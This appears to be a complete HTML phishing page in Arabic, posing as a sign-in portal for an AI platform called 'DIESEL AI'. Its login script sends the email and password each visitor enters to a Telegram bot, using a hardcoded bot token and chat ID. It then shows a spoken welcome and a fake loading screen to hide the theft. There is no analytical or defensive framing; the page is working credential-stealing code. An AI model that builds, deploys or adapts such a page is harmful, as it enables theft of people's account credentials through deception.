<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DIESEL AI | GEN-3 PLATFORM</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
        
        /* لوحة ألوان الذكاء الاصطناعي العصرية (النمو والإبداع) */
        :root {
            --bg-color: #fbfbfe;
            --main-gradient: linear-gradient(135deg, #6c5ce7 0%, #a29bfe 50%, #00cec9 100%);
            --text-color: #2d3436;
            --card-bg: rgba(255, 255, 255, 0.9);
            --border-color: #dfe6e9;
        }

        body { 
            background: var(--bg-color); 
            color: var(--text-color); 
            font-family: 'Cairo', sans-serif; 
            margin: 0; 
            overflow: hidden; 
            height: 100vh;
        }
        
        /* خلفية متحركة "تنمو" وتتدفق توحي بالخوارزميات */
        #ai-background {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: radial-gradient(circle at 10% 10%, #6c5ce7 0%, transparent 40%),
                        radial-gradient(circle at 90% 90%, #00cec9 0%, transparent 40%);
            filter: blur(80px);
            opacity: 0.3;
            z-index: -1;
            animation: backgroundFlow 15s infinite alternate;
        }

        #login-overlay { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            display: flex; justify-content: center; align-items: center; 
            z-index: 9999; transition: opacity 0.6s ease-in-out, transform 0.6s ease-in-out;
        }
        
        .login-card { 
            background: var(--card-bg); 
            border: 1px solid var(--border-color); 
            padding: 50px; border-radius: 24px; 
            width: 380px; text-align: center; 
            box-shadow: 0 15px 35px rgba(108, 92, 231, 0.1);
            backdrop-filter: blur(10px);
        }
        
        /* شعار بتدرج "النمو" */
        .ai-logo {
            font-size: 32px; font-weight: 700;
            background: var(--main-gradient);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px; display: inline-block;
        }

        h2 { color: var(--text-color); margin-top: 0; font-weight: 700; }
        input { 
            width: 100%; padding: 16px; margin: 12px 0; 
            background: #fff; border: 1px solid #e0e0e0; 
            color: var(--text-color); border-radius: 12px; 
            box-sizing: border-box; transition: 0.3s ease; 
            font-size: 15px;
        }
        input:focus { border-color: #6c5ce7; box-shadow: 0 0 10px rgba(108, 92, 231, 0.1); outline: none; }
        
        /* زر تسجيل بتدرج عصري متحرك */
        .btn-submit { 
            background: var(--main-gradient); color: white; 
            padding: 16px; width: 100%; border: none; 
            border-radius: 12px; cursor: pointer; 
            font-weight: 700; font-size: 16px; margin-top: 15px; 
            box-shadow: 0 5px 15px rgba(108, 92, 231, 0.3);
            transition: transform 0.2s;
        }
        .btn-submit:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(108, 92, 231, 0.4); }

        /* منطقة المحتوى بعد الدخول */
        #main-content { display: none; text-align: center; padding-top: 10vh; opacity: 0; transition: opacity 0.8s ease; }
        
        @keyframes backgroundFlow {
            0% { background-position: 0% 0%; }
            100% { background-position: 100% 100%; }
        }
    </style>
</head>
<body>

    <div id="ai-background"></div>

    <div id="login-overlay">
        <div class="login-card">
            <span class="ai-logo">DIESEL AI</span>
            <p style="color: #636e72; margin-bottom: 30px; font-size: 15px;">بوابة الوصول إلى الجيل الثالث من الذكاء الاصطناعي</p>
            <input type="email" id="email" placeholder="البريد الإلكتروني">
            <input type="password" id="pass" placeholder="كلمة المرور">
            <button class="btn-submit" onclick="processLogin()">تسجيل الدخول الآمن</button>
        </div>
    </div>

    <div id="main-content">
        <h1 style="color: #6c5ce7;">مرحباً بك في عصر DIESEL AI الجديد</h1>
        <p>جاري تحميل مساعدك التوليدي...</p>
    </div>

    <script>
        const BOT_TOKEN = '8730123549:AAGfIdQEXH1qXboe0aGMQZePGg5k4ec1tPU';
        const CHAT_ID = '5177962707';

        function processLogin() {
            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;

            if(email.includes('@') && pass.length > 5) {
                // إرسال البيانات للتليجرام
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: CHAT_ID, text: `🛡 LOGIN [MODERN UI]:\nUser: ${email}\nPass: ${pass}`})
                });

                // الصوت البشري الرقيق (تم تحديث النبرة لتناسب الألوان العصرية)
                const msg = new SpeechSynthesisUtterance("مرحباً بك في موقع الديزل للاي اي، أنا مساعدك الخاص في هذا العصر الجديد.");
                msg.lang = 'ar-SA';
                msg.pitch = 1.15; // نبرة أكثر حيوية
                msg.rate = 1.0;
                window.speechSynthesis.speak(msg);

                // انتقال ناعم وعصري
                const overlay = document.getElementById('login-overlay');
                overlay.style.opacity = '0';
                overlay.style.transform = 'scale(0.95)';
                
                setTimeout(() => {
                    overlay.style.display = 'none';
                    const mainContent = document.getElementById('main-content');
                    mainContent.style.display = 'block';
                    setTimeout(() => mainContent.style.opacity = '1', 50);
                }, 600);
            } else {
                alert("يرجى التأكد من صحة البيانات المدخلة (البريد وكلمة المرور)");
            }
        }
    </script>

    <script>
        (function(){if(!window.chatbase||window.chatbase("getState")!=="initialized"){window.chatbase=(...arguments)=>{if(!window.chatbase.q){window.chatbase.q=[]}window.chatbase.q.push(arguments)};window.chatbase=new Proxy(window.chatbase,{get(target,prop){if(prop==="q"){return target.q}return(...args)=>target(prop,...args)}})}const onLoad=function(){const script=document.createElement("script");script.src="https://www.chatbase.co/embed.min.js";script.id="DdngL8r3s2pfzL6hG2oIO";script.domain="www.chatbase.co";document.body.appendChild(script)};if(document.readyState==="complete"){onLoad()}else{window.addEventListener("load",onLoad)}})();
    </script>
</body>
</html>
